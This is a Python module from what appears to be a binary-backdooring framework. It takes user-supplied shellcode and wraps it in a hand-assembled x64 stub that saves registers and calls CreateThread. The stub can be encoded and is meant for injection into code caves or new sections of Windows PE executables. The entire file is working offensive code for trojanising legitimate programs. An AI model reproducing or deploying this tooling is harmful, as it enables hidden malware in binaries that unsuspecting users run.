import struct
import os
import logging
from core import enum
from core import support

from pe.core import eat_code_caves
from common import common
logger = logging.getLogger(__name__)

class text_loader_user_supplied_shellcode_threaded():

    def __init__(self):
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = "text_loader_user_supplied_shellcode_threaded"
        self.description = """User supplied shellocde payload for text loaders"""
        self.requirements = {'MODE':'How the patching will happen',
                             'SUPPLIED_SHELLCODE':'User suppled shellcode in raw format',
                             'IDT_IN_CAVE': 'Put new imports in a existing cave',
                             'ENCODER': '<Encoder you want to use, else none>'
                             }
        self.supported_modes = ['text_loader_single_cave',
                                'cfg_loader_single_cave',
                                'text_loader_add_section',
                                'cfg_loader_add_section',
                                'text_loader_payload_splitting',
                                'cfg_loader_payload_splitting']
        self.shellcode = ""
        self.stackpreserve = bytes("\x90\x50\x53\x51\x52\x56\x57\x55\x41\x50"
                              "\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              , 'iso-8859-1')
        self.stackrestore = bytes("\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                             "\x41\x58\x5d\x5c\x5f\x5e\x5a\x59\x5b\x58", 'iso-8859-1'
                             )
        self.apis_needed = [b'LoadLibraryA', b'GetProcAddress',
                                 b'VirtualAlloc', b'CreateThread']
        self.payload_type = 'text_loader'

    def invoke(self, PM):
        # Expose patching method objects
        self.PM = PM
        # Expose BDF method objects
        self.BDF = self.PM.BDF
        logger.debug(f"IN PAYLOAD DEBUG: {dir(self)}")
        if support.support(self).check_reqs() is False:
            return False
        return self.run()

    def run(self):
        """
        Completed IAT based payload includes spawning of thread.
        """

        for api in self.apis_needed:
            if api not in self.PM.BDF.pe_object:
                logger.error(f"API not found: {api}")
                return False

        self.payload_stub = open(self.SUPPLIED_SHELLCODE, 'r+b').read()

        # BEGIN THREAD STUB
        self.thread_stub = b"\xe8\x00\x00\x00\x00"                           # call self
        self.thread_stub += b"\x5B"                                          # pop rbx; addresss to rbx
        self.thread_stub += b"\x48\x83\xC3\x3e"                                  # add len of self.thread_stub to rbx

        self.thread_stub += bytes(                    
                            "\x48\x31\xC0"                                  # xor rax,rax
                            "\x50"                                          # push rax          ; LPDWORD lpThreadId (NULL)
                            "\x50"                                          # push rax          ; DWORD dwCreationFlags (0)
                            "\x49\x89\xC1"                                  # mov r9, rax        ; LPVOID lpParameter (NULL)
                            "\x48\x89\xC2"                                  # mov rdx, rax        ; SIZE_T dwStackSize (0 for default) 
                            "\x49\x89\xD8"                                  # mov r8, rbx         ; SLPTHREAD_START_ROUTINE lpStartAddress (payload)
                            "\x48\x89\xC1"                                  # mov rcx, rax        ; LPSECURITY_ATTRIBUTES lpThreadAttributes (NULL)
                            "\x48\x83\xEC\x20"                              # sub rsp, 0x20
                            "\x41\xFF\x17",                                 # call qword ptr [r15]
                            'iso-8859-1'
                            )
        if 'cfg' in self.PM.found_mode.name:
            self.thread_stub += b"\x48\x83\xC4\x50"                              # add rsp, 48
        else:
            self.thread_stub += b"\x48\x83\xC4\x48"
                            #stackrestore
        self.thread_stub += bytes("\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                            "\x41\x58\x5d\x5f\x5e\x5a\x59\x5b\x58",
                            'iso-8859-1')
        self.thread_stub += b"\xe9"

        self.thread_stub += struct.pack("<I", len(self.payload_stub))

        # ENCODER WORKFLOW
        if self.PM.found_encoder:
            logger.debug(f'Len payload_stub before encoding: {len(self.payload_stub)}')

            decoding_stub, encoded_stub = self.PM.found_encoder.run(self.thread_stub + self.payload_stub, self.BDF)
            self.payload_stub = decoding_stub + encoded_stub
            logger.debug(f'Len payload after encoding: {len(self.payload_stub)}')

            self.PM.BDF.pe_object['payload_stub'] = self.payload_stub
            self.shellcode = self.payload_stub

        else:

            # note these are not encoded...
            self.PM.BDF.pe_object['thread_stub'] = self.thread_stub
            logger.info(f"CreateThread stub len: {hex(len(self.BDF.pe_object['thread_stub']))}, {len(self.BDF.pe_object['thread_stub'])}")

            self.PM.BDF.pe_object['payload_stub'] = self.payload_stub
            self.shellcode = self.thread_stub + self.payload_stub

        # END ENCODER

        return (self.shellcode, )    
